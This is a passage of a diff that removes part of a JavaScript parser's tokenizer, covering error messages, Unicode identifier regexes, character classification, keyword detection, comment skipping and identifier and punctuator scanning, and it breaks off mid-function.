   AccessorDataProperty:  'Object literal may not have data and accessor property with the same name'<c><\n>-        AccessorGetSet:  'Object literal may not have multiple get/set accessors with the same name'<c><\n>-        StrictLHSAssignment:  'Assignment to eval or arguments is not allowed in strict mode'<c><\n>-        StrictLHSPostfix:  'Postfix increment/decrement may not have eval or arguments operand in strict mode'<c><\n>-        StrictLHSPrefix:  'Prefix increment/decrement may not have eval or arguments operand in strict mode'<c><\n>-        StrictReservedWord:  'Use of future reserved word in strict mode'<c><\n>-        MissingFromClause: 'Missing from clause'<c><\n>-        NoAsAfterImportNamespace: 'Missing as after import *'<c><\n>-        InvalidModuleSpecifier: 'Invalid module specifier'<c><\n>-        NoUnintializedConst: 'Const must be initialized'<c><\n>-        ComprehensionRequiresBlock: 'Comprehension must have at least one block'<c><\n>-        ComprehensionError:  'Comprehension Error'<c><\n>-        EachNotAllowed:  'Each is not supported'<\n>-    };<\n>-    // See also tools/generate-unicode-regex.py.<\n>-    Regex = {<\n>-        NonAsciiIdentifierStart: new RegExp('[\xaa\xb5\xba\xc0-\xd6\xd8-\xf6\xf8-\u02c1\u02c6-\u02d1\u02e0-\u02e4\u02ec\u02ee\u0370-\u0374\u0376\u0377\u037a-\u037d\u0386\u0388-\u038a\u038c\u038e-\u03a1\u03a3-\u03f5\u03f7-\u0481\u048a-\u0527\u0531-\u0556\u0559\u0561-\u0587\u05d0-\u05ea\u05f0-\u05f2\u0620-\u064a\u066e\u066f\u0671-\u06d3\u06d5\u06e5\u06e6\u06ee\u06ef\u06fa-\u06fc\u06ff\u0710\u0712-\u072f\u074d-\u07a5\u07b1\u07ca-\u07ea\u07f4\u07f5\u07fa\u0800-\u0815\u081a\u0824\u0828\u0840-\u0858\u08a0\u08a2-\u08ac\u0904-\u0939\u093d\u0950\u0958-\u0961\u0971-\u0977\u0979-\u097f\u0985-\u098c\u098f\u0990\u0993-\u09a8\u09aa-\u09b0\u09b2\u09b6-\u09b9\u09bd\u09ce\u09dc\u09dd\u09df-\u09e1\u09f0\u09f1\u0a05-\u0a0a\u0a0f\u0a10\u0a13-\u0a28\u0a2a-\u0a30\u0a32\u0a33\u0a35\u0a36\u0a38\u0a39\u0a59-\u0a5c\u0a5e\u0a72-\u0a74\u0a85-\u0a8d\u0a8f-\u0a91\u0a93-\u0aa8\u0aaa-\u0ab0\u0ab2\u0ab3\u0ab5-\u0ab9\u0abd\u0ad0\u0ae0\u0ae1\u0b05-\u0b0c\u0b0f\u0b10\u0b13-\u0b28\u0b2a-\u0b30\u0b32\u0b33\u0b35-\u0b39\u0b3d\u0b5c\u0b5d\u0b5f-\u0b61\u0b71\u0b83\u0b85-\u0b8a\u0b8e-\u0b90\u0b92-\u0b95\u0b99\u0b9a\u0b9c\u0b9e\u0b9f\u0ba3\u0ba4\u0ba8-\u0baa\u0bae-\u0bb9\u0bd0\u0c05-\u0c0c\u0c0e-\u0c10\u0c12-\u0c28\u0c2a-\u0c33\u0c35-\u0c39\u0c3d\u0c58\u0c59\u0c60\u0c61\u0c85-\u0c8c\u0c8e-\u0c90\u0c92-\u0ca8\u0caa-\u0cb3\u0cb5-\u0cb9\u0cbd\u0cde\u0ce0\u0ce1\u0cf1\u0cf2\u0d05-\u0d0c\u0d0e-\u0d10\u0d12-\u0d3a\u0d3d\u0d4e\u0d60\u0d61\u0d7a-\u0d7f\u0d85-\u0d96\u0d9a-\u0db1\u0db3-\u0dbb\u0dbd\u0dc0-\u0dc6\u0e01-\u0e30\u0e32\u0e33\u0e40-\u0e46\u0e81\u0e82\u0e84\u0e87\u0e88\u0e8a\u0e8d\u0e94-\u0e97\u0e99-\u0e9f\u0ea1-\u0ea3\u0ea5\u0ea7\u0eaa\u0eab\u0ead-\u0eb0\u0eb2\u0eb3\u0ebd\u0ec0-\u0ec4\u0ec6\u0edc-\u0edf\u0f00\u0f40-\u0f47\u0f49-\u0f6c\u0f88-\u0f8c\u1000-\u102a\u103f\u1050-\u1055\u105a-\u105d\u1061\u1065\u1066\u106e-\u1070\u1075-\u1081\u108e\u10a0-\u10c5\u10c7\u10cd\u10d0-\u10fa\u10fc-\u1248\u124a-\u124d\u1250-\u1256\u1258\u125a-\u125d\u1260-\u1288\u128a-\u128d\u1290-\u12b0\u12b2-\u12b5\u12b8-\u12be\u12c0\u12c2-\u12c5\u12c8-\u12d6\u12d8-\u1310\u1312-\u1315\u1318-\u135a\u1380-\u138f\u13a0-\u13f4\u1401-\u166c\u166f-\u167f\u1681-\u169a\u16a0-\u16ea\u16ee-\u16f0\u1700-\u170c\u170e-\u1711\u1720-\u1731\u1740-\u1751\u1760-\u176c\u176e-\u1770\u1780-\u17b3\u17d7\u17dc\u1820-\u1877\u1880-\u18a8\u18aa\u18b0-\u18f5\u1900-\u191c\u1950-\u196d\u1970-\u1974\u1980-\u19ab\u19c1-\u19c7\u1a00-\u1a16\u1a20-\u1a54\u1aa7\u1b05-\u1b33\u1b45-\u1b4b\u1b83-\u1ba0\u1bae\u1baf\u1bba-\u1be5\u1c00-\u1c23\u1c4d-\u1c4f\u1c5a-\u1c7d\u1ce9-\u1cec\u1cee-\u1cf1\u1cf5\u1cf6\u1d00-\u1dbf\u1e00-\u1f15\u1f18-\u1f1d\u1f20-\u1f45\u1f48-\u1f4d\u1f50-\u1f57\u1f59\u1f5b\u1f5d\u1f5f-\u1f7d\u1f80-\u1fb4\u1fb6-\u1fbc\u1fbe\u1fc2-\u1fc4\u1fc6-\u1fcc\u1fd0-\u1fd3\u1fd6-\u1fdb\u1fe0-\u1fec\u1ff2-\u1ff4\u1ff6-\u1ffc\u2071\u207f\u2090-\u209c\u2102\u2107\u210a-\u2113\u2115\u2119-\u211d\u2124\u2126\u2128\u212a-\u212d\u212f-\u2139\u213c-\u213f\u2145-\u2149\u214e\u2160-\u2188\u2c00-\u2c2e\u2c30-\u2c5e\u2c60-\u2ce4\u2ceb-\u2cee\u2cf2\u2cf3\u2d00-\u2d25\u2d27\u2d2d\u2d30-\u2d67\u2d6f\u2d80-\u2d96\u2da0-\u2da6\u2da8-\u2dae\u2db0-\u2db6\u2db8-\u2dbe\u2dc0-\u2dc6\u2dc8-\u2dce\u2dd0-\u2dd6\u2dd8-\u2dde\u2e2f\u3005-\u3007\u3021-\u3029\u3031-\u3035\u3038-\u303c\u3041-\u3096\u309d-\u309f\u30a1-\u30fa\u30fc-\u30ff\u3105-\u312d\u3131-\u318e\u31a0-\u31ba\u31f0-\u31ff\u3400-\u4db5\u4e00-\u9fcc\ua000-\ua48c\ua4d0-\ua4fd\ua500-\ua60c\ua610-\ua61f\ua62a\ua62b\ua640-\ua66e\ua67f-\ua697\ua6a0-\ua6ef\ua717-\ua71f\ua722-\ua788\ua78b-\ua78e\ua790-\ua793\ua7a0-\ua7aa\ua7f8-\ua801\ua803-\ua805\ua807-\ua80a\ua80c-\ua822\ua840-\ua873\ua882-\ua8b3\ua8f2-\ua8f7\ua8fb\ua90a-\ua925\ua930-\ua946\ua960-\ua97c\ua984-\ua9b2\ua9cf\uaa00-\uaa28\uaa40-\uaa42\uaa44-\uaa4b\uaa60-\uaa76\uaa7a\uaa80-\uaaaf\uaab1\uaab5\uaab6\uaab9-\uaabd\uaac0\uaac2\uaadb-\uaadd\uaae0-\uaaea\uaaf2-\uaaf4\uab01-\uab06\uab09-\uab0e\uab11-\uab16\uab20-\uab26\uab28-\uab2e\uabc0-\uabe2\uac00-\ud7a3\ud7b0-\ud7c6\ud7cb-\ud7fb\uf900-\ufa6d\ufa70-\ufad9\ufb00-\ufb06\ufb13-\ufb17\ufb1d\ufb1f-\ufb28\ufb2a-\ufb36\ufb38-\ufb3c\ufb3e\ufb40\ufb41\ufb43\ufb44\ufb46-\ufbb1\ufbd3-\ufd3d\ufd50-\ufd8f\ufd92-\ufdc7\ufdf0-\ufdfb\ufe70-\ufe74\ufe76-\ufefc\uff21-\uff3a\uff41-\uff5a\uff66-\uffbe\uffc2-\uffc7\uffca-\uffcf\uffd2-\uffd7\uffda-\uffdc]')<c><\n>-        NonAsciiIdentifierPart: new RegExp('[\xaa\xb5\xba\xc0-\xd6\xd8-\xf6\xf8-\u02c1\u02c6-\u02d1\u02e0-\u02e4\u02ec\u02ee\u0300-\u0374\u0376\u0377\u037a-\u037d\u0386\u0388-\u038a\u038c\u038e-\u03a1\u03a3-\u03f5\u03f7-\u0481\u0483-\u0487\u048a-\u0527\u0531-\u0556\u0559\u0561-\u0587\u0591-\u05bd\u05bf\u05c1\u05c2\u05c4\u05c5\u05c7\u05d0-\u05ea\u05f0-\u05f2\u0610-\u061a\u0620-\u0669\u066e-\u06d3\u06d5-\u06dc\u06df-\u06e8\u06ea-\u06fc\u06ff\u0710-\u074a\u074d-\u07b1\u07c0-\u07f5\u07fa\u0800-\u082d\u0840-\u085b\u08a0\u08a2-\u08ac\u08e4-\u08fe\u0900-\u0963\u0966-\u096f\u0971-\u0977\u0979-\u097f\u0981-\u0983\u0985-\u098c\u098f\u0990\u0993-\u09a8\u09aa-\u09b0\u09b2\u09b6-\u09b9\u09bc-\u09c4\u09c7\u09c8\u09cb-\u09ce\u09d7\u09dc\u09dd\u09df-\u09e3\u09e6-\u09f1\u0a01-\u0a03\u0a05-\u0a0a\u0a0f\u0a10\u0a13-\u0a28\u0a2a-\u0a30\u0a32\u0a33\u0a35\u0a36\u0a38\u0a39\u0a3c\u0a3e-\u0a42\u0a47\u0a48\u0a4b-\u0a4d\u0a51\u0a59-\u0a5c\u0a5e\u0a66-\u0a75\u0a81-\u0a83\u0a85-\u0a8d\u0a8f-\u0a91\u0a93-\u0aa8\u0aaa-\u0ab0\u0ab2\u0ab3\u0ab5-\u0ab9\u0abc-\u0ac5\u0ac7-\u0ac9\u0acb-\u0acd\u0ad0\u0ae0-\u0ae3\u0ae6-\u0aef\u0b01-\u0b03\u0b05-\u0b0c\u0b0f\u0b10\u0b13-\u0b28\u0b2a-\u0b30\u0b32\u0b33\u0b35-\u0b39\u0b3c-\u0b44\u0b47\u0b48\u0b4b-\u0b4d\u0b56\u0b57\u0b5c\u0b5d\u0b5f-\u0b63\u0b66-\u0b6f\u0b71\u0b82\u0b83\u0b85-\u0b8a\u0b8e-\u0b90\u0b92-\u0b95\u0b99\u0b9a\u0b9c\u0b9e\u0b9f\u0ba3\u0ba4\u0ba8-\u0baa\u0bae-\u0bb9\u0bbe-\u0bc2\u0bc6-\u0bc8\u0bca-\u0bcd\u0bd0\u0bd7\u0be6-\u0bef\u0c01-\u0c03\u0c05-\u0c0c\u0c0e-\u0c10\u0c12-\u0c28\u0c2a-\u0c33\u0c35-\u0c39\u0c3d-\u0c44\u0c46-\u0c48\u0c4a-\u0c4d\u0c55\u0c56\u0c58\u0c59\u0c60-\u0c63\u0c66-\u0c6f\u0c82\u0c83\u0c85-\u0c8c\u0c8e-\u0c90\u0c92-\u0ca8\u0caa-\u0cb3\u0cb5-\u0cb9\u0cbc-\u0cc4\u0cc6-\u0cc8\u0cca-\u0ccd\u0cd5\u0cd6\u0cde\u0ce0-\u0ce3\u0ce6-\u0cef\u0cf1\u0cf2\u0d02\u0d03\u0d05-\u0d0c\u0d0e-\u0d10\u0d12-\u0d3a\u0d3d-\u0d44\u0d46-\u0d48\u0d4a-\u0d4e\u0d57\u0d60-\u0d63\u0d66-\u0d6f\u0d7a-\u0d7f\u0d82\u0d83\u0d85-\u0d96\u0d9a-\u0db1\u0db3-\u0dbb\u0dbd\u0dc0-\u0dc6\u0dca\u0dcf-\u0dd4\u0dd6\u0dd8-\u0ddf\u0df2\u0df3\u0e01-\u0e3a\u0e40-\u0e4e\u0e50-\u0e59\u0e81\u0e82\u0e84\u0e87\u0e88\u0e8a\u0e8d\u0e94-\u0e97\u0e99-\u0e9f\u0ea1-\u0ea3\u0ea5\u0ea7\u0eaa\u0eab\u0ead-\u0eb9\u0ebb-\u0ebd\u0ec0-\u0ec4\u0ec6\u0ec8-\u0ecd\u0ed0-\u0ed9\u0edc-\u0edf\u0f00\u0f18\u0f19\u0f20-\u0f29\u0f35\u0f37\u0f39\u0f3e-\u0f47\u0f49-\u0f6c\u0f71-\u0f84\u0f86-\u0f97\u0f99-\u0fbc\u0fc6\u1000-\u1049\u1050-\u109d\u10a0-\u10c5\u10c7\u10cd\u10d0-\u10fa\u10fc-\u1248\u124a-\u124d\u1250-\u1256\u1258\u125a-\u125d\u1260-\u1288\u128a-\u128d\u1290-\u12b0\u12b2-\u12b5\u12b8-\u12be\u12c0\u12c2-\u12c5\u12c8-\u12d6\u12d8-\u1310\u1312-\u1315\u1318-\u135a\u135d-\u135f\u1380-\u138f\u13a0-\u13f4\u1401-\u166c\u166f-\u167f\u1681-\u169a\u16a0-\u16ea\u16ee-\u16f0\u1700-\u170c\u170e-\u1714\u1720-\u1734\u1740-\u1753\u1760-\u176c\u176e-\u1770\u1772\u1773\u1780-\u17d3\u17d7\u17dc\u17dd\u17e0-\u17e9\u180b-\u180d\u1810-\u1819\u1820-\u1877\u1880-\u18aa\u18b0-\u18f5\u1900-\u191c\u1920-\u192b\u1930-\u193b\u1946-\u196d\u1970-\u1974\u1980-\u19ab\u19b0-\u19c9\u19d0-\u19d9\u1a00-\u1a1b\u1a20-\u1a5e\u1a60-\u1a7c\u1a7f-\u1a89\u1a90-\u1a99\u1aa7\u1b00-\u1b4b\u1b50-\u1b59\u1b6b-\u1b73\u1b80-\u1bf3\u1c00-\u1c37\u1c40-\u1c49\u1c4d-\u1c7d\u1cd0-\u1cd2\u1cd4-\u1cf6\u1d00-\u1de6\u1dfc-\u1f15\u1f18-\u1f1d\u1f20-\u1f45\u1f48-\u1f4d\u1f50-\u1f57\u1f59\u1f5b\u1f5d\u1f5f-\u1f7d\u1f80-\u1fb4\u1fb6-\u1fbc\u1fbe\u1fc2-\u1fc4\u1fc6-\u1fcc\u1fd0-\u1fd3\u1fd6-\u1fdb\u1fe0-\u1fec\u1ff2-\u1ff4\u1ff6-\u1ffc\u200c\u200d\u203f\u2040\u2054\u2071\u207f\u2090-\u209c\u20d0-\u20dc\u20e1\u20e5-\u20f0\u2102\u2107\u210a-\u2113\u2115\u2119-\u211d\u2124\u2126\u2128\u212a-\u212d\u212f-\u2139\u213c-\u213f\u2145-\u2149\u214e\u2160-\u2188\u2c00-\u2c2e\u2c30-\u2c5e\u2c60-\u2ce4\u2ceb-\u2cf3\u2d00-\u2d25\u2d27\u2d2d\u2d30-\u2d67\u2d6f\u2d7f-\u2d96\u2da0-\u2da6\u2da8-\u2dae\u2db0-\u2db6\u2db8-\u2dbe\u2dc0-\u2dc6\u2dc8-\u2dce\u2dd0-\u2dd6\u2dd8-\u2dde\u2de0-\u2dff\u2e2f\u3005-\u3007\u3021-\u302f\u3031-\u3035\u3038-\u303c\u3041-\u3096\u3099\u309a\u309d-\u309f\u30a1-\u30fa\u30fc-\u30ff\u3105-\u312d\u3131-\u318e\u31a0-\u31ba\u31f0-\u31ff\u3400-\u4db5\u4e00-\u9fcc\ua000-\ua48c\ua4d0-\ua4fd\ua500-\ua60c\ua610-\ua62b\ua640-\ua66f\ua674-\ua67d\ua67f-\ua697\ua69f-\ua6f1\ua717-\ua71f\ua722-\ua788\ua78b-\ua78e\ua790-\ua793\ua7a0-\ua7aa\ua7f8-\ua827\ua840-\ua873\ua880-\ua8c4\ua8d0-\ua8d9\ua8e0-\ua8f7\ua8fb\ua900-\ua92d\ua930-\ua953\ua960-\ua97c\ua980-\ua9c0\ua9cf-\ua9d9\uaa00-\uaa36\uaa40-\uaa4d\uaa50-\uaa59\uaa60-\uaa76\uaa7a\uaa7b\uaa80-\uaac2\uaadb-\uaadd\uaae0-\uaaef\uaaf2-\uaaf6\uab01-\uab06\uab09-\uab0e\uab11-\uab16\uab20-\uab26\uab28-\uab2e\uabc0-\uabea\uabec\uabed\uabf0-\uabf9\uac00-\ud7a3\ud7b0-\ud7c6\ud7cb-\ud7fb\uf900-\ufa6d\ufa70-\ufad9\ufb00-\ufb06\ufb13-\ufb17\ufb1d-\ufb28\ufb2a-\ufb36\ufb38-\ufb3c\ufb3e\ufb40\ufb41\ufb43\ufb44\ufb46-\ufbb1\ufbd3-\ufd3d\ufd50-\ufd8f\ufd92-\ufdc7\ufdf0-\ufdfb\ufe00-\ufe0f\ufe20-\ufe26\ufe33\ufe34\ufe4d-\ufe4f\ufe70-\ufe74\ufe76-\ufefc\uff10-\uff19\uff21-\uff3a\uff3f\uff41-\uff5a\uff66-\uffbe\uffc2-\uffc7\uffca-\uffcf\uffd2-\uffd7\uffda-\uffdc]')<\n>-    };<\n>-    // Ensure the condition is true<c> otherwise throw an error.<\n>-    // This is only to have a better contract semantic<c> i.e. another safety net<\n>-    // to catch a logic error. The condition shall be fulfilled in normal case.<\n>-    // Do NOT use this to enforce a certain condition on any user input.<\n>-    function assert(condition<c> message) {<\n>-        /* istanbul ignore if */<\n>-        if (!condition) {<\n>-            throw new Error('ASSERT: ' + message);<\n>-        }<\n>-    }<\n>-    function StringMap() {<\n>-        this.$data = {};<\n>-    }<\n>-    StringMap.prototype.get = function (key) {<\n>-        key = '$' + key;<\n>-        return this.$data[key];<\n>-    };<\n>-    StringMap.prototype.set = function (key<c> value) {<\n>-        key = '$' + key;<\n>-        this.$data[key] = value;<\n>-        return this;<\n>-    };<\n>-    StringMap.prototype.has = function (key) {<\n>-        key = '$' + key;<\n>-        return Object.prototype.hasOwnProperty.call(this.$data<c> key);<\n>-    };<\n>-    StringMap.prototype['delete'] = function (key) {<\n>-        key = '$' + key;<\n>-        return delete this.$data[key];<\n>-    };<\n>-    function isDecimalDigit(ch) {<\n>-        return (ch >= 48 && ch <= 57);   // 0..9<\n>-    }<\n>-    function isHexDigit(ch) {<\n>-        return '0123456789abcdefABCDEF'.indexOf(ch) >= 0;<\n>-    }<\n>-    function isOctalDigit(ch) {<\n>-        return '01234567'.indexOf(ch) >= 0;<\n>-    }<\n>-    // 7.2 White Space<\n>-    function isWhiteSpace(ch) {<\n>-        return (ch === 32) ||  // space<\n>-            (ch === 9) ||      // tab<\n>-            (ch === 0xB) ||<\n>-            (ch === 0xC) ||<\n>-            (ch === 0xA0) ||<\n>-            (ch >= 0x1680 && '\u1680\u180E\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200A\u202F\u205F\u3000\uFEFF'.indexOf(String.fromCharCode(ch)) > 0);<\n>-    }<\n>-    // 7.3 Line Terminators<\n>-    function isLineTerminator(ch) {<\n>-        return (ch === 10) || (ch === 13) || (ch === 0x2028) || (ch === 0x2029);<\n>-    }<\n>-    // 7.6 Identifier Names and Identifiers<\n>-    function isIdentifierStart(ch) {<\n>-        return (ch === 36) || (ch === 95) ||  // $ (dollar) and _ (underscore)<\n>-            (ch >= 65 && ch <= 90) ||         // A..Z<\n>-            (ch >= 97 && ch <= 122) ||        // a..z<\n>-            (ch === 92) ||                    // \ (backslash)<\n>-            ((ch >= 0x80) && Regex.NonAsciiIdentifierStart.test(String.fromCharCode(ch)));<\n>-    }<\n>-    function isIdentifierPart(ch) {<\n>-        return (ch === 36) || (ch === 95) ||  // $ (dollar) and _ (underscore)<\n>-            (ch >= 65 && ch <= 90) ||         // A..Z<\n>-            (ch >= 97 && ch <= 122) ||        // a..z<\n>-            (ch >= 48 && ch <= 57) ||         // 0..9<\n>-            (ch === 92) ||                    // \ (backslash)<\n>-            ((ch >= 0x80) && Regex.NonAsciiIdentifierPart.test(String.fromCharCode(ch)));<\n>-    }<\n>-    // 7.6.1.2 Future Reserved Words<\n>-    function isFutureReservedWord(id) {<\n>-        switch (id) {<\n>-        case 'class':<\n>-        case 'enum':<\n>-        case 'export':<\n>-        case 'extends':<\n>-        case 'import':<\n>-        case 'super':<\n>-            return true;<\n>-        default:<\n>-            return false;<\n>-        }<\n>-    }<\n>-    function isStrictModeReservedWord(id) {<\n>-        switch (id) {<\n>-        case 'implements':<\n>-        case 'interface':<\n>-        case 'package':<\n>-        case 'private':<\n>-        case 'protected':<\n>-        case 'public':<\n>-        case 'static':<\n>-        case 'yield':<\n>-        case 'let':<\n>-            return true;<\n>-        default:<\n>-            return false;<\n>-        }<\n>-    }<\n>-    function isRestrictedWord(id) {<\n>-        return id === 'eval' || id === 'arguments';<\n>-    }<\n>-    // 7.6.1.1 Keywords<\n>-    function isKeyword(id) {<\n>-        if (strict && isStrictModeReservedWord(id)) {<\n>-            return true;<\n>-        }<\n>-        // 'const' is specialized as Keyword in V8.<\n>-        // 'yield' is only treated as a keyword in strict mode.<\n>-        // 'let' is for compatiblity with SpiderMonkey and ES.next.<\n>-        // Some others are from future reserved words.<\n>-        switch (id.length) {<\n>-        case 2:<\n>-            return (id === 'if') || (id === 'in') || (id === 'do');<\n>-        case 3:<\n>-            return (id === 'var') || (id === 'for') || (id === 'new') ||<\n>-                (id === 'try') || (id === 'let');<\n>-        case 4:<\n>-            return (id === 'this') || (id === 'else') || (id === 'case') ||<\n>-                (id === 'void') || (id === 'with') || (id === 'enum');<\n>-        case 5:<\n>-            return (id === 'while') || (id === 'break') || (id === 'catch') ||<\n>-                (id === 'throw') || (id === 'const') ||<\n>-                (id === 'class') || (id === 'super');<\n>-        case 6:<\n>-            return (id === 'return') || (id === 'typeof') || (id === 'delete') ||<\n>-                (id === 'switch') || (id === 'export') || (id === 'import');<\n>-        case 7:<\n>-            return (id === 'default') || (id === 'finally') || (id === 'extends');<\n>-        case 8:<\n>-            return (id === 'function') || (id === 'continue') || (id === 'debugger');<\n>-        case 10:<\n>-            return (id === 'instanceof');<\n>-        default:<\n>-            return false;<\n>-        }<\n>-    }<\n>-    // 7.4 Comments<\n>-    function skipComment() {<\n>-        var ch<c> blockComment<c> lineComment;<\n>-        blockComment = false;<\n>-        lineComment = false;<\n>-        while (index < length) {<\n>-            ch = source.charCodeAt(index);<\n>-            if (lineComment) {<\n>-                ++index;<\n>-                if (isLineTerminator(ch)) {<\n>-                    lineComment = false;<\n>-                    if (ch === 13 && source.charCodeAt(index) === 10) {<\n>-                        ++index;<\n>-                    }<\n>-                    ++lineNumber;<\n>-                    lineStart = index;<\n>-                }<\n>-            } else if (blockComment) {<\n>-                if (isLineTerminator(ch)) {<\n>-                    if (ch === 13 && source.charCodeAt(index + 1) === 10) {<\n>-                        ++index;<\n>-                    }<\n>-                    ++lineNumber;<\n>-                    ++index;<\n>-                    lineStart = index;<\n>-                    if (index >= length) {<\n>-                        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-                    }<\n>-                } else {<\n>-                    ch = source.charCodeAt(index++);<\n>-                    if (index >= length) {<\n>-                        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-                    }<\n>-                    // Block comment ends with '*/' (char #42<c> char #47).<\n>-                    if (ch === 42) {<\n>-                        ch = source.charCodeAt(index);<\n>-                        if (ch === 47) {<\n>-                            ++index;<\n>-                            blockComment = false;<\n>-                        }<\n>-                    }<\n>-                }<\n>-            } else if (ch === 47) {<\n>-                ch = source.charCodeAt(index + 1);<\n>-                // Line comment starts with '//' (char #47<c> char #47).<\n>-                if (ch === 47) {<\n>-                    index += 2;<\n>-                    lineComment = true;<\n>-                } else if (ch === 42) {<\n>-                    // Block comment starts with '/*' (char #47<c> char #42).<\n>-                    index += 2;<\n>-                    blockComment = true;<\n>-                    if (index >= length) {<\n>-                        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-                    }<\n>-                } else {<\n>-                    break;<\n>-                }<\n>-            } else if (isWhiteSpace(ch)) {<\n>-                ++index;<\n>-            } else if (isLineTerminator(ch)) {<\n>-                ++index;<\n>-                if (ch === 13 && source.charCodeAt(index) === 10) {<\n>-                    ++index;<\n>-                }<\n>-                ++lineNumber;<\n>-                lineStart = index;<\n>-            } else {<\n>-                break;<\n>-            }<\n>-        }<\n>-    }<\n>-    function scanHexEscape(prefix) {<\n>-        var i<c> len<c> ch<c> code = 0;<\n>-        len = (prefix === 'u') ? 4 : 2;<\n>-        for (i = 0; i < len; ++i) {<\n>-            if (index < length && isHexDigit(source[index])) {<\n>-                ch = source[index++];<\n>-                code = code * 16 + '0123456789abcdef'.indexOf(ch.toLowerCase());<\n>-            } else {<\n>-                return '';<\n>-            }<\n>-        }<\n>-        return String.fromCharCode(code);<\n>-    }<\n>-    function scanUnicodeCodePointEscape() {<\n>-        var ch<c> code<c> cu1<c> cu2;<\n>-        ch = source[index];<\n>-        code = 0;<\n>-        // At least<c> one hex digit is required.<\n>-        if (ch === '}') {<\n>-            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-        }<\n>-        while (index < length) {<\n>-            ch = source[index++];<\n>-            if (!isHexDigit(ch)) {<\n>-                break;<\n>-            }<\n>-            code = code * 16 + '0123456789abcdef'.indexOf(ch.toLowerCase());<\n>-        }<\n>-        if (code > 0x10FFFF || ch !== '}') {<\n>-            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-        }<\n>-        // UTF-16 Encoding<\n>-        if (code <= 0xFFFF) {<\n>-            return String.fromCharCode(code);<\n>-        }<\n>-        cu1 = ((code - 0x10000) >> 10) + 0xD800;<\n>-        cu2 = ((code - 0x10000) & 1023) + 0xDC00;<\n>-        return String.fromCharCode(cu1<c> cu2);<\n>-    }<\n>-    function getEscapedIdentifier() {<\n>-        var ch<c> id;<\n>-        ch = source.charCodeAt(index++);<\n>-        id = String.fromCharCode(ch);<\n>-        // '\u' (char #92<c> char #117) denotes an escaped character.<\n>-        if (ch === 92) {<\n>-            if (source.charCodeAt(index) !== 117) {<\n>-                throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-            }<\n>-            ++index;<\n>-            ch = scanHexEscape('u');<\n>-            if (!ch || ch === '\\' || !isIdentifierStart(ch.charCodeAt(0))) {<\n>-                throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-            }<\n>-            id = ch;<\n>-        }<\n>-        while (index < length) {<\n>-            ch = source.charCodeAt(index);<\n>-            if (!isIdentifierPart(ch)) {<\n>-                break;<\n>-            }<\n>-            ++index;<\n>-            id += String.fromCharCode(ch);<\n>-            // '\u' (char #92<c> char #117) denotes an escaped character.<\n>-            if (ch === 92) {<\n>-                id = id.substr(0<c> id.length - 1);<\n>-                if (source.charCodeAt(index) !== 117) {<\n>-                    throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-                }<\n>-                ++index;<\n>-                ch = scanHexEscape('u');<\n>-                if (!ch || ch === '\\' || !isIdentifierPart(ch.charCodeAt(0))) {<\n>-                    throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-                }<\n>-                id += ch;<\n>-            }<\n>-        }<\n>-        return id;<\n>-    }<\n>-    function getIdentifier() {<\n>-        var start<c> ch;<\n>-        start = index++;<\n>-        while (index < length) {<\n>-            ch = source.charCodeAt(index);<\n>-            if (ch === 92) {<\n>-                // Blackslash (char #92) marks Unicode escape sequence.<\n>-                index = start;<\n>-                return getEscapedIdentifier();<\n>-            }<\n>-            if (isIdentifierPart(ch)) {<\n>-                ++index;<\n>-            } else {<\n>-                break;<\n>-            }<\n>-        }<\n>-        return source.slice(start<c> index);<\n>-    }<\n>-    function scanIdentifier() {<\n>-        var start<c> id<c> type;<\n>-        start = index;<\n>-        // Backslash (char #92) starts an escaped character.<\n>-        id = (source.charCodeAt(index) === 92) ? getEscapedIdentifier() : getIdentifier();<\n>-        // There is no keyword or literal with only one character.<\n>-        // Thus<c> it must be an identifier.<\n>-        if (id.length === 1) {<\n>-            type = Token.Identifier;<\n>-        } else if (isKeyword(id)) {<\n>-            type = Token.Keyword;<\n>-        } else if (id === 'null') {<\n>-            type = Token.NullLiteral;<\n>-        } else if (id === 'true' || id === 'false') {<\n>-            type = Token.BooleanLiteral;<\n>-        } else {<\n>-            type = Token.Identifier;<\n>-        }<\n>-        return {<\n>-            type: type<c><\n>-            value: id<c><\n>-            lineNumber: lineNumber<c><\n>-            lineStart: lineStart<c><\n>-            range: [start<c> index]<\n>-        };<\n>-    }<\n>-    // 7.7 Punctuators<\n>-    function scanPunctuator() {<\n>-        var start = index<c><\n>-            code = source.charCodeAt(index)<c><\n>-            code2<c><\n>-            ch1 = source[index]<c><\n>-            ch2<c><\n>-            ch3<c><\n>-            ch4;<\n>-        switch (code) {<\n>-        // Check for most common single-character punctuators.<\n>-        case 40:   // ( open bracket<\n>-        case 41:   // ) close bracket<\n>-        case 59:   // ; semicolon<\n>-        case 44:   // <c> comma<\n>-        case 123:  // { open curly brace<\n>-        case 125:  // } close curly brace<\n>-        case 91:   // [<\n>-        case 93:   // ]<\n>-        case 58:   // :<\n>-        case 63:   // ?<\n>-        case 126:  // ~<\n>-            ++index;<\n>-            if (extra.tokenize) {<\n>-                if (code === 40) {<\n>-                    extra.openParenToken = extra.tokens.length;<\n>-                } else if (code === 123) {<\n>-                    extra.openCurlyToken = extra.tokens.length;<\n>-                }<\n>-            }<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: String.fromCharCode(code)<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        default:<\n>-            code2 = source.charCodeAt(index + 1);<\n>-            // '=' (char #61) marks an assignment or comparison operator.<\n>-            if (code2 === 61) {<\n>-                switch (code) {<\n>-                case 37:  // %<\n>-                case 38:  // &<\n>-                case 42:  // *:<\n>-                case 43:  // +<\n>-                case 45:  // -<\n>-                case 47:  // /<\n>-                case 60:  // <<\n>-                case 62:  // ><\n>-                case 94:  // ^<\n>-                case 124: // |<\n>-                    index += 2;<\n>-                    return {<\n>-                        type: Token.Punctuator<c><\n>-                        value: String.fromCharCode(code) + String.fromCharCode(code2)<c><\n>-                        lineNumber: lineNumber<c><\n>-          